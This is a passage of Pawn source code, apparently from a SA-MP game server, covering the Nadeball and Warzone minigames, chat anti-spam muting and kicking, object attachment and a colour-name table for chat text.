					SetPlayerColor( nbplayerlist[nbP] , nbteam2colour);
					nbteam2players++;
				}
				SetCameraBehindPlayer( nbplayerlist[nbP] );
				SetPlayerArmour( nbplayerlist[nbP] , 0.0);
				ResetPlayerWeapons( nbplayerlist[nbP] );
		  		GivePlayerWeapon( nbplayerlist[nbP] , 16, 1000);

				rplaceused++;
			}
		}
	} else if (nbfield == 2) // 2 = SF
	{
		nbfieldteam1 = CreateDynamicRectangle(-2771.30, -250.45, -2753.27, -232.09);
		nbfieldteam2 = CreateDynamicRectangle(-2790.03, -250.45, -2772.00, -232.09);

		for (new nbP = 0; nbP < MAX_NADEBALL_PLAYERS; nbP++)
		{
			if (!IsPlayerConnected( nbplayerlist[nbP] ) || nbplayerlist[nbP] == -1)
			continue;

		    if (player[ nbplayerlist[nbP] ][playingnb] == 1)
		    {
			    player[ nbplayerlist[nbP] ][playernbmode] = 1;
				if (player[ nbplayerlist[nbP] ][playernbteam] == 1)
				{
					SetPlayerPos( nbplayerlist[nbP] , -2762.635 + (nbteam1players / 1.5), -241.27 + (nbteam1players / 1.5), 7.15);
					SetPlayerFacingAngle( nbplayerlist[nbP] , 90.0);
					SetPlayerColor( nbplayerlist[nbP] , nbteam1colour);
					nbteam1players++;
				} else {
					SetPlayerPos( nbplayerlist[nbP] , -2780.665 + (nbteam2players / 1.5), -241.27 + (nbteam2players / 1.5), 7.15);
					SetPlayerFacingAngle( nbplayerlist[nbP] , -90.0);
					SetPlayerColor( nbplayerlist[nbP] , nbteam2colour);
					nbteam2players++;
				}
				SetCameraBehindPlayer( nbplayerlist[nbP] );
				SetPlayerArmour( nbplayerlist[nbP] , 0.0);
				ResetPlayerWeapons( nbplayerlist[nbP] );
		  		GivePlayerWeapon( nbplayerlist[nbP] , 16, 1000);

				rplaceused++;
			}
		}
	} else { // 3 = LV
		nbfieldteam1 = CreateDynamicRectangle(1861.80, 2831.78, 1873.18, 2844.21);
		nbfieldteam2 = CreateDynamicRectangle(1861.80, 2820.05, 1873.18, 2832.48);

		for (new nbP = 0; nbP < MAX_NADEBALL_PLAYERS; nbP++)
		{
			if (!IsPlayerConnected( nbplayerlist[nbP] ) || nbplayerlist[nbP] == -1)
			continue;

		    if (player[ nbplayerlist[nbP] ][playingnb] == 1)
		    {
			    player[ nbplayerlist[nbP] ][playernbmode] = 1;
				if (player[ nbplayerlist[nbP] ][playernbteam] == 1)
				{
					SetPlayerPos( nbplayerlist[nbP] , 1867.49 + (nbteam1players / 1.5), 2838.00 + (nbteam1players / 1.5), 10.83);
					SetPlayerFacingAngle( nbplayerlist[nbP] , 180.0);
					SetPlayerColor( nbplayerlist[nbP] , nbteam1colour);
					nbteam1players++;
				} else {
					SetPlayerPos( nbplayerlist[nbP] , 1867.49 + (nbteam2players / 1.5), 2826.26 + (nbteam2players / 1.5), 10.83);
					SetPlayerFacingAngle( nbplayerlist[nbP] , 0.0);
					SetPlayerColor( nbplayerlist[nbP] , nbteam2colour);
					nbteam2players++;
				}
				SetCameraBehindPlayer( nbplayerlist[nbP] );
				SetPlayerArmour( nbplayerlist[nbP] , 0.0);
				ResetPlayerWeapons( nbplayerlist[nbP] );
		  		GivePlayerWeapon( nbplayerlist[nbP] , 16, 1000);

				rplaceused++;
			}
		}
	}
	nbplayers = rplaceused;
	return 1;
}

stock StartNB()
{
    nbstarted = true;

	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
		if (IsPlayerConnected(rp) && player[rp][playingnb] == 1)
		{
			TogglePlayerControllable(rp, 1);
			GameTextForPlayer(rp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~NADEBALL ~g~STARTED!", 2000, 3);
		}
	}

	SendServerMessageToAll(EMBED_CORAL, "Nadeball has started!");
	IRC_GroupSay(1, IRC_CHANNEL, "14Nadeball has started!");
	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_nadeball_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_nadeball_played` = server_statistic_nadeball_played +1", false, "", "");
	return 1;
}

stock StopNB()
{
	nbstarted = false;
	
	DestroyDynamicArea(nbfieldteam1);
	DestroyDynamicArea(nbfieldteam2);
	
	nbplayers = 0;
	nbsecondsleft = -5;
	nbgames = 0;
	nbteam1wins = 0;
	nbteam2wins = 0;
	nbfield = 0;
	nbteam1players = 0;
	nbteam2players = 0;
	
	for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
	{
	    nbplayerlist[listplayers] = -1;
	}
	return 1;
}

stock AddWarzonePlayer(playerid)
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	player[playerid][playingwarzone] = 1;
	player[playerid][playerwarzonemode] = 1;
	warzoneplayers++;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (warzoneplayers == 1)
	{
		format(strings, sizeof(strings), "%s has joined Warzone [/warzone - Max.Players: %d]", playername, MAX_WARZONE_PLAYERS);
		SendServerMessageToAll(EMBED_PINKRED, strings);
		format(strings, sizeof(strings), "6 %s has joined Warzone [/warzone - Max.Players: %d]", playername, MAX_WARZONE_PLAYERS);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		warzonesecondsleft = 60;
		//warzonesecondsleft = 15;
		crews[GROUP_ATTACKERS] = 1;
		crews[GROUP_DEFENDERS] = 1;

		mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_WARZONE_BASES"", true, "QS_LoadWarzoneBasesList", "iii", playerid, player[playerid][cinc], DIALOGID_WARZONELIST);
	} else {
		TextDrawShowForPlayer(playerid, wzteamtd1);
		TextDrawShowForPlayer(playerid, wzteamtd2);
		TextDrawShowForPlayer(playerid, wzteamtd3);
		SelectTextDraw(playerid, COLOR_GREY);

		format(strings, sizeof(strings), "[S]: "EMBED_PINKRED"%s has joined Warzone [Players: %d/%d]", playername, warzoneplayers, MAX_WARZONE_PLAYERS);
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			SendClientMessage(acp, COLOR_NAVYBLUE, strings);
		}
	}
	SendServerMessage(playerid, EMBED_SPRINGGREEN, "Please select your team and weapon set.");

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    if (pSObject[playerid][i][so_object] != -1)
	    {
		    DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
		RemovePlayerAttachedObject(playerid, pi);
	}
	return 1;
}

stock RemoveWarzonePlayer(playerid, reason[])
{
	warzoneplayers--;

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[S]: "EMBED_PINKRED"%s left Warzone. (%s)", playername, reason);
	for (new acp = 0; acp < MAX_PLAYERS; acp++)
	{
		if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
		SendClientMessage(acp, COLOR_NAVYBLUE, strings);
	}

	format(strings, sizeof(strings), "6 %s left Warzone. (%s)", playername, reason);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	//SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);

	TextDrawHideForPlayer(playerid, wzhelptd1);
	TextDrawHideForPlayer(playerid, wzhelptd2);
	TextDrawHideForPlayer(playerid, wzteamtd1);
	TextDrawHideForPlayer(playerid, wzteamtd2);
	TextDrawHideForPlayer(playerid, wzteamtd3);
	TextDrawHideForPlayer(playerid, wzweaponsettd1);
	TextDrawHideForPlayer(playerid, wzweaponsettd2);
	TextDrawHideForPlayer(playerid, wzweaponsettd3);
	TextDrawHideForPlayer(playerid, wzweaponsettd4);
	TextDrawHideForPlayer(playerid, wzweaponsettd5);
	TextDrawHideForPlayer(playerid, wzstatustd1);
	TextDrawHideForPlayer(playerid, wzstatustd2);
	SetPlayerTeam(playerid, playerid);

    if (warzonestarted == false)
	{
	    if (warzoneplayers <= 1)
	    {
			StopWarzone();
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
				{
					TextDrawHideForPlayer(cp, wzhelptd1);
					TextDrawHideForPlayer(cp, wzhelptd2);
					TextDrawHideForPlayer(cp, wzteamtd1);
					TextDrawHideForPlayer(cp, wzteamtd2);
					TextDrawHideForPlayer(cp, wzteamtd3);
					TextDrawHideForPlayer(cp, wzweaponsettd1);
					TextDrawHideForPlayer(cp, wzweaponsettd2);
					TextDrawHideForPlayer(cp, wzweaponsettd3);
					TextDrawHideForPlayer(cp, wzweaponsettd4);
					TextDrawHideForPlayer(cp, wzweaponsettd5);
					TextDrawHideForPlayer(cp, wzstatustd1);
					TextDrawHideForPlayer(cp, wzstatustd2);
				
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingwarzone] = 0;
					player[cp][playerwarzoneteam] = 0;
					if (player[cp][playerwarzonemode] == 1)
					{
						if (IsPlayerInAnyVehicle(cp)) RemovePlayerFromVehicleEx(cp);
						SpawnPlayer(cp);
						player[cp][playerwarzonemode] = 0;
					} else {
						player[cp][Spectating] = 0;
						player[cp][SpectatingOn] = -1;
					    TogglePlayerSpectating(cp, false);
					}
				 	player[cp][playerwarzoneset] = 0;
					player[cp][moviecrew] = -1;
					SetPlayerTeam(cp, cp);
					SetPlayerArmour(cp, 0.00);
				}
			}
			SendServerMessageToAll(EMBED_PINKRED, "Stopped Warzone. (No winner found)");
			IRC_GroupSay(1, IRC_CHANNEL, "6Stopped Warzone. (No winner found)");
		} else {
			player[playerid][playingwarzone] 	= 0;
			player[playerid][playerwarzoneteam]	= 0;
		 	player[playerid][playerwarzoneset] 	= 0;
			player[playerid][Spectating] 		= 0;
			player[playerid][SpectatingOn] 		= -1;
		    TogglePlayerSpectating(playerid, false);
		    SpawnPlayer(playerid);
			player[playerid][moviecrew] = -1;
			SetPlayerArmour(playerid, 0.00);
		}
	} else if (warzonestarted == true)
	{
		if (player[playerid][playerwarzoneteam] == 1) warzoneattackersleft--;
		else warzonedefendersleft--;
		player[playerid][playerwarzonemode] = 0;
	
		if (warzonedefendersleft == 0)
	    {
			StopWarzone();
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
				{
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingwarzone] = 0;
					player[cp][playerwarzoneteam] = 0;
					if (player[cp][playerwarzonemode] == 1)
					{
						if (IsPlayerInAnyVehicle(cp)) RemovePlayerFromVehicleEx(cp);
						SpawnPlayer(cp);
						player[cp][playerwarzonemode] = 0;
					} else {
						player[cp][Spectating] = 0;
						player[cp][SpectatingOn] = -1;
					    TogglePlayerSpectating(cp, false);
					}
				 	player[cp][playerwarzoneset] = 0;
					player[cp][moviecrew] = -1;
					SetPlayerTeam(cp, cp);
					SetPlayerArmour(cp, 0.00);
				}
			}
			SendServerMessageToAll(EMBED_PINKRED, "The "EMBED_RED"Attackers"EMBED_PINKRED" have killed all the Defenders and won!");
			IRC_GroupSay(1, IRC_CHANNEL, "6The 4Attackers 6have killed all the Defenders and won!");
	    } else if (warzoneattackersleft == 0)
	    {
			StopWarzone();
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
				{
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingwarzone] = 0;
					player[cp][playerwarzoneteam] = 0;
					if (player[cp][playerwarzonemode] == 1)
					{
						if (IsPlayerInAnyVehicle(cp)) RemovePlayerFromVehicleEx(cp);
						SpawnPlayer(cp);
						player[cp][playerwarzonemode] = 0;
					} else {
						player[cp][Spectating] = 0;
						player[cp][SpectatingOn] = -1;
					    TogglePlayerSpectating(cp, false);
					}
				 	player[cp][playerwarzoneset] = 0;
					player[cp][moviecrew] = -1;
					SetPlayerTeam(cp, cp);
					SetPlayerArmour(cp, 0.00);
				}
			}
			SendServerMessageToAll(EMBED_PINKRED, "The "EMBED_BLUE"Defenders"EMBED_PINKRED" have killed all the Attackers and won!");
			IRC_GroupSay(1, IRC_CHANNEL, "6The 12Defenders 6have killed all the Attackers and won!");
	    } else {
			if (player[playerid][playerwarzoneteam] == 1)
			{
				for (new wzPlayer = (warzoneattackers-warzoneattackersleft); wzPlayer < MAX_WARZONE_PLAYERS; wzPlayer++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer] ) || warzoneplayerlist[wzPlayer] == -1)
					continue;

					if (player[ warzoneplayerlist[wzPlayer] ][playerwarzoneteam] == 1 && player[ warzoneplayerlist[wzPlayer] ][playerwarzonemode] == 1)
					{
						player[playerid][spawned] = 1;
						player[playerid][Spectating] = 1;
						player[playerid][SpectatingOn] = warzoneplayerlist[wzPlayer];

						TogglePlayerSpectating(playerid, true);
						SetPlayerInterior(playerid, GetPlayerInterior( warzoneplayerlist[wzPlayer] ));
						SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld( warzoneplayerlist[wzPlayer] ));

						if (IsPlayerInAnyVehicle( warzoneplayerlist[wzPlayer] )) PlayerSpectateVehicle(playerid, GetPlayerVehicleID( warzoneplayerlist[wzPlayer] ));
						else PlayerSpectatePlayer(playerid, warzoneplayerlist[wzPlayer]);

						GetPlayerName(warzoneplayerlist[wzPlayer], giveplayername, sizeof(giveplayername));
						format(stringe, sizeof(stringe), "Spectating team mate %s (id: %d)", giveplayername, warzoneplayerlist[wzPlayer]);
						SendServerMessage(playerid, EMBED_SPRINGGREEN, stringe);
						break;
					}
				}
			} else if (player[playerid][playerwarzoneteam] == 2)
			{
				for (new wzPlayer = (warzonedefenders-warzonedefendersleft); wzPlayer < MAX_WARZONE_PLAYERS; wzPlayer++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer] ) || warzoneplayerlist[wzPlayer] == -1)
					continue;

					if (player[ warzoneplayerlist[wzPlayer] ][playerwarzoneteam] == 2 && player[ warzoneplayerlist[wzPlayer] ][playerwarzonemode] == 1)
					{
						player[playerid][spawned] = 1;
						player[playerid][Spectating] = 1;
						player[playerid][SpectatingOn] = warzoneplayerlist[wzPlayer];

						TogglePlayerSpectating(playerid, true);
						SetPlayerInterior(playerid, GetPlayerInterior( warzoneplayerlist[wzPlayer] ));
						SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld( warzoneplayerlist[wzPlayer] ));

						if (IsPlayerInAnyVehicle( warzoneplayerlist[wzPlayer] ))
						PlayerSpectateVehicle(playerid, GetPlayerVehicleID( warzoneplayerlist[wzPlayer] ));
						else PlayerSpectatePlayer(playerid, warzoneplayerlist[wzPlayer]);

						GetPlayerName(warzoneplayerlist[wzPlayer], giveplayername, sizeof(giveplayername));
						format(stringe, sizeof(stringe), "Spectating team mate %s (id: %d)", giveplayername, warzoneplayerlist[wzPlayer]);
						SendServerMessage(playerid, EMBED_SPRINGGREEN, stringe);
						break;
					}
				}
			} else {
			    SetPlayerVirtualWorld(playerid, WORLDID_DEFAULT);
				RemovePlayerFromVehicleEx(playerid);
			    SpawnPlayer(playerid);
			}
			
			for (new wzP = 0; wzP < MAX_WARZONE_PLAYERS; wzP++)
			{
			    if (warzoneplayerlist[wzP] == -1)
			    continue;

				if (warzoneplayerlist[wzP] == playerid)
				{
					warzoneplayerlist[wzP] = -1;
					break;
				}
			}
	    }
	}
	return 1;
}

stock LoadWarzone()
{
	if (warzoneplayers < MIN_WARZONE_PLAYERS || warzoneattackers == 0 || warzonedefenders == 0)
	{
		StopWarzone();
		SendServerMessageToAll(EMBED_CORAL, "Warzone was not started because there were not enough players.");
		IRC_GroupSay(1, IRC_CHANNEL, "6Warzone was not started because there were not enough players.");
		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingwarzone] == 1)
			{
				GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~WARZONE ~r~STOPPED!", 2000, 3);
				if (servergodmode) player[dp][godmode] = 1;
				SetPlayerColor(dp, PlayerColors[random(sizeof(PlayerColors))]);
				player[dp][playingwarzone] = 0;
				player[dp][playerwarzoneteam] = 0;
				player[dp][playerwarzonemode] = 0;
			 	player[dp][playerwarzoneset] = 0;
				player[dp][moviecrew] = -1;
				if (IsPlayerInAnyVehicle(dp)) RemovePlayerFromVehicleEx(dp);
				SpawnPlayer(dp);
				TextDrawHideForPlayer(dp, wzhelptd1);
				TextDrawHideForPlayer(dp, wzhelptd2);
				TextDrawHideForPlayer(dp, wzteamtd1);
				TextDrawHideForPlayer(dp, wzteamtd2);
				TextDrawHideForPlayer(dp, wzteamtd3);
				TextDrawHideForPlayer(dp, wzweaponsettd1);
				TextDrawHideForPlayer(dp, wzweaponsettd2);
				TextDrawHideForPlayer(dp, wzweaponsettd3);
				TextDrawHideForPlayer(dp, wzweaponsettd4);
				TextDrawHideForPlayer(dp, wzweaponsettd5);
				TextDrawHideForPlayer(dp, wzstatustd1);
				TextDrawHideForPlayer(dp, wzstatustd2);
				SetPlayerTeam(dp, dp);

		    }
		}
	} else mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_WARZONE_SETTINGS" LIMIT 1", true, "QS_LoadWarzoneSettings", "");
	return 1;
}

stock StartWarzone()
{
	warzonestarted 			= true;

	for (new wzPlayer = 0; wzPlayer < MAX_WARZONE_PLAYERS; wzPlayer++)
	{
		if (!IsPlayerConnected( warzoneplayerlist[wzPlayer] ) || warzoneplayerlist[wzPlayer] == -1)
		continue;

		if (player[ warzoneplayerlist[wzPlayer] ][playingwarzone] == 1)
		{
			TogglePlayerControllable(warzoneplayerlist[wzPlayer], 1);

			TextDrawHideForPlayer(warzoneplayerlist[wzPlayer], wzhelptd1);
			TextDrawHideForPlayer(warzoneplayerlist[wzPlayer], wzhelptd2);

			TextDrawShowForPlayer(warzoneplayerlist[wzPlayer], wzstatustd1);
			TextDrawShowForPlayer(warzoneplayerlist[wzPlayer], wzstatustd2);
			if (player[ warzoneplayerlist[wzPlayer] ][playerwarzoneteam] == 1)
			{
				for (new wzPlayer2 = 0; wzPlayer2 < MAX_WARZONE_PLAYERS; wzPlayer2++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer2] ) || warzoneplayerlist[wzPlayer2] == -1)
					continue;
					
				    if (player[ warzoneplayerlist[wzPlayer2] ][playerwarzoneteam] == 2)
				    SetPlayerMarkerForPlayer(warzoneplayerlist[wzPlayer2], warzoneplayerlist[wzPlayer], ( warzonecolourattackers & COLOR_INVISIBLE ));
				}
			} else {
				for (new wzPlayer2 = 0; wzPlayer2 < MAX_WARZONE_PLAYERS; wzPlayer2++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer2] ) || warzoneplayerlist[wzPlayer2] == -1)
					continue;

				    if (player[ warzoneplayerlist[wzPlayer2] ][playerwarzoneteam] == 1)
				    SetPlayerMarkerForPlayer(warzoneplayerlist[wzPlayer2], warzoneplayerlist[wzPlayer], ( warzonecolourdefenders & COLOR_INVISIBLE ));
				}
			}
			GameTextForPlayer(warzoneplayerlist[wzPlayer], "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~WARZONE ~g~STARTED!", 2000, 3);
		}
	}
	SendServerMessageToAll(EMBED_PINKRED, "Warzone has started!");
	IRC_GroupSay(1, IRC_CHANNEL, "6Warzone has started!");

	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_warzone_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_warzone_played` = server_statistic_warzone_played +1", false, "", "");
	return 1;
}

stock StopWarzone()
{
	warzonestarted 				= false;

 	warzoneplayers				= 0,
    warzonesecondsleft  		= -2;
    warzonesecondslefttillcap   = 31;
    warzoneminuteslefttillend   = 10;
    warzonesecondslefttillend   = 0;
    warzonebase                 = 0;
    warzonemode                 = 0;
    warzoneattackers    		= 0;
    warzonedefenders    		= 0;
    warzoneattackersleft   		= 0;
    warzonedefendersleft   		= 0;
    warzoneskinattackers        = 62;
	warzoneskindefenders        = 171;
	/*warzoneattackersset2limit	= 0;
	warzonedefendersset2limit	= 0;*/
	warzonecolourattackers      = COLOR_RED;
	warzonecolourdefenders      = COLOR_BLUE;

	if (warzonegangzone != -1) 				GangZoneHideForAll(warzonegangzone), GangZoneDestroy(warzonegangzone);
    if (warzonecheckpoint_base != -1) 		DestroyDynamicCP(warzonecheckpoint_base);
    if (warzonecheckpoint_airborne != -1)	DestroyDynamicRaceCP(warzonecheckpoint_airborne);
    warzonegangzone             = -1;
	warzonecheckpoint_base 		= -1;
    warzonecheckpoint_airborne 	= -1;

	TextDrawSetString(wzstatustd1, "_");
	TextDrawSetString(wzstatustd2, "_");

	for (new listplayers = 0; listplayers < MAX_WARZONE_PLAYERS; listplayers++)
	{
	    warzoneplayerlist[listplayers] = -1;
	}

	for (new i = GAMEMODE_VEHICLES; i < MAX_VEHICLES; i++)
	{
	    if (GetVehicleVirtualWorld(i) == WORLDID_WARZONE)
	    {
			vehicle[i][Owner] 		= -1;
			vehicle[i][Objective] 	= 0;
			vehicle[i][Locked] 		= 0;
			DestroyVehicle(i);
		}
	}
	crews[GROUP_ATTACKERS] = 0;
	crews[GROUP_DEFENDERS] = 0;
	return 1;
}

stock AntiSpam(playerid, time_delay, bool:message = true)
{
	new String[64];
 	new player_delay = gettime() - player[playerid][delay];
	if (player_delay < time_delay)
	{
	    if (message)
		{
			format(String, sizeof(String), "You need to wait %d seconds for this command!", time_delay - player_delay);
			SendErrorMessage(playerid, EMBED_RED, String);
		}
		return 0;
  	}else{
		player[playerid][delay] = gettime();
		return 1;
	}
}

stock SpamProtection(playerid, source[15])
{
	if (player[playerid][spamcount] == 0) { player[playerid][spamprotection] = player[playerid][playtime]; }

    player[playerid][spamcount]++;
	if (player[playerid][playtime] - player[playerid][spamprotection] > SPAM_TIMELIMIT)
	{
		player[playerid][spamcount] = 1;
		player[playerid][spamprotection] = player[playerid][playtime];
	}
	else if (player[playerid][spamcount] == SPAM_MAX_MSGS)
	{
	    GetPlayerName(playerid, playername, sizeof(playername));
     	player[playerid][spamcounttokick]++;

	    if (!player[playerid][RULEStextdraw])
		{
			TextDrawShowForPlayer(playerid, nrules);
			player[playerid][RULEStextdraw] = 1;
	    }

	    if (player[playerid][spamcounttokick] == 3)
		{
			if (IsPlayerRegistered(playerid))
			{
				new mysqlStr[128];
				format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(playerid));
				mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
			}
			
			format(logstring, sizeof(logstring), "%s has been kicked. (Excessive Flood/Spam - Source: %s)", playername, source);
			SendServerMessageToAll(EMBED_RED, logstring);
			printflog("SPAM-K", logstring);
			format(logstring, sizeof(logstring), "15,6 %s has been kicked. (Excessive Flood/Spam - Source: %s)", playername, source);
			IRC_GroupSay(1, IRC_CHANNEL, logstring);
			KickEx(playerid);
	    } else {
  			player[playerid][muted] = 1;
			format(logstring, sizeof(logstring), "%s (%d) has been muted. (Flood/Spam %d - Source: %s)", playername, playerid, player[playerid][spamcounttokick], source);
			SendServerMessageToAll(EMBED_RED, logstring);
			printflog("SPAM-M", logstring);

			format(logstring, sizeof(logstring), "15,6 %s (%d) has been muted. (Flood/Spam %d - Source: %s)", playername, playerid, player[playerid][spamcounttokick], source);
			IRC_GroupSay(1, IRC_CHANNEL, logstring);
			SetTimerEx("SpamUnmute", 60000, 0, "i", playerid);
		}
	}
 	return 1;
}

public SpamUnmute(playerid)
{
	if (player[playerid][muted] == 0) return 1;

	GetPlayerName(playerid, playername, sizeof(playername));
	format(logstring, sizeof(logstring), "%s (%d) has been unmuted.", playername, playerid);
	SendServerMessageToAll(EMBED_RED, logstring);
	printflog("SPAM-UM", logstring);

	format(logstring, sizeof(logstring), "15,6 %s (%d) has been unmuted.", playername, playerid);
	IRC_GroupSay(1, IRC_CHANNEL, logstring);
	player[playerid][muted] = 0;
	return 1;
}

public earthquake()
{
	new scale = random(5000);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		SetPlayerDrunkLevel(i, scale);
	}
	return 1;
}

public earthquake2()
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		SetPlayerDrunkLevel(i, 0);
	}
	return 1;
}

public ReloadStickedObjects(playerid)
{
	for (new pi = 0; pi < VIP_MAX_OSTICKS; pi++)
	{
	    if (pSObject[playerid][pi][so_model] == -1)
		continue;

		if (pSObject[playerid][pi][so_object] == -1)
		pSObject[playerid][pi][so_object] = CreateObject(pSObject[playerid][pi][so_model], 0, 0, 0, 0, 0, 0);

		if (pSObject[playerid][pi][so_isvehicle] == 0) // is stickied to player
		{
			AttachObjectToPlayer(pSObject[playerid][pi][so_object], playerid, pSObject[playerid][pi][so_x], pSObject[playerid][pi][so_y], pSObject[playerid][pi][so_z], pSObject[playerid][pi][so_rx], pSObject[playerid][pi][so_ry], pSObject[playerid][pi][so_rz]);
		} else { // is stickied to vehicle
		    new voID = GetPlayerVehicleID(playerid);

			if (!voID && GetVehicleModel(pSObject[playerid][pi][so_vehiclemodel])) // player is not in a vehicle, does his vehicle he attached the object to still exist? if yes, re-attach to the vehicle just to sync (maybe the car is streamed in a few meters away, sync to players who teleport/stream in get to see it too)
			{
				AttachObjectToVehicle(pSObject[playerid][pi][so_object], pSObject[playerid][pi][so_isvehicle], pSObject[playerid][pi][so_x], pSObject[playerid][pi][so_y], pSObject[playerid][pi][so_z], pSObject[playerid][pi][so_rx], pSObject[playerid][pi][so_ry], pSObject[playerid][pi][so_rz]);
			} else if (voID && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && pSObject[playerid][pi][so_vehiclemodel] == GetVehicleModel(voID)) // player is in a vehicle and is the driver of it and the vehicle model is the one he attached the object to
			{
			    pSObject[playerid][pi][so_isvehicle] = voID; // vehicle ID updated, when destroyed, destroy objects as well (visually only)
				AttachObjectToVehicle(pSObject[playerid][pi][so_object], pSObject[playerid][pi][so_isvehicle], pSObject[playerid][pi][so_x], pSObject[playerid][pi][so_y], pSObject[playerid][pi][so_z], pSObject[playerid][pi][so_rx], pSObject[playerid][pi][so_ry], pSObject[playerid][pi][so_rz]);
			}
		}
	}
	return 1;
}

public SetCriminalInvisible()
{
	if (IsPlayerConnected(currentcccriminal))
	{
		if (GetVehicleModel( GetPlayerVehicleID(currentcccriminal) ) == 596 && !IsPlayerDriver(currentcccriminal)) return 1;
		else SetPlayerColor(currentcccriminal, (COLOR_CORAL & COLOR_INVISIBLE));
	}
	return 1;
}

stock ResetBounds(playerid)
SetPlayerWorldBounds(playerid,20000.0000,-20000.0000, 20000.0000,-20000.0000);

/*stock IdleSpot(playerid)
SetPlayerPos(playerid,861.7352,-24.5963,63.7234); // the "idle zone"*/

stock ColouredText(text[])
{
    enum
        colorEnum
        {
            colorName[14],
            colorID[9]
        }
    ;
    new
        colorInfo[42][colorEnum] =
        {
			{ "WHITE",			"{FFFFFF}" },
			{ "GREEN",			"{33AA33}" },
			{ "RED",			"{FF0000}" },
			{ "BLUE",			"{0000FF}" },
			{ "PINK",			"{FF69B4}" },
			{ "PURPLE",			"{9900FF}" },
			{ "YELLOW",			"{FFFF00}" },
			{ "BROWN",			"{A52A2A}" },
			{ "GREY",			"{AFAFAF}" },
			{ "BLACK",			"{000000}" },
			{ "LPINK",			"{F64BC2}" },
			{ "ORANGE",			"{FF8000}" },
			{ "PINKRED",		"{FF0040}" },
			{ "DARKRED",		"{DC143C}" },
			{ "DARKERRED",		"{660000}" },
			{ "ORANGERED",		"{FF4500}" },
			{ "TOMATO",			"{FF6347}" },
			{ "LIGHTBLUE",		"{33CCFF}" },
			{ "LIGHTNAVY",		"{8FFDFF}" },
			{ "NAVYBLUE",		"{3366FF}" },
			{ "LBLUE",			"{00FFFF}" },
			{ "LLBLUE",			"{0080FF}" },
			{ "FLBLUE",			"{6495ED}" },
			{ "BLUEVIOLET",		"{8A2BE2}" },
			{ "BISQUE",			"{FFE4C4}" },
			{ "LIME",			"{10F441}" },
			{ "LAWNGREEN",		"{7CFC00}" },
			{ "SEAGREEN",		"{20B2AA}" },
			{ "LIMEGREEN",		"{32CD32}" },
			{ "SPRINGGREEN",	"{00FF7F}" },
			{ "YELLOWGREEN",	"{9ACD32}" },
			{ "GREENYELLOW",	"{ADFF2F}" },
			{ "OLIVE",			"{808000}" },
			{ "AQUA",			"{F0F8FF}" },
			{ "MEDIUMAQUA",		"{83BFBF}" },
			{ "MAGENTA",		"{FF00FF}" },
			{ "MEDIUMMAGENTA",	"{8B008B}" },
			{ "CHARTREUSE",		"{7FFF00}" },
			{ "CORAL",			"{FF7F50}" },
			{ "GOLD",			"{B8860B}" },
			{ "INDIGO",			"{4B00B0}" },
			{ "IVORY",			"{FFFF82}" }
        },
        string[(128 + 32)],
        tempString[16],
        pos = -1,
        x
    ;
    strmid(string, text, 0, 128, sizeof(string));

    for ( ; x != sizeof(colorInfo); ++x)
    {
        format(tempString, sizeof(tempString), "-%s", colorInfo[x][colorName]);

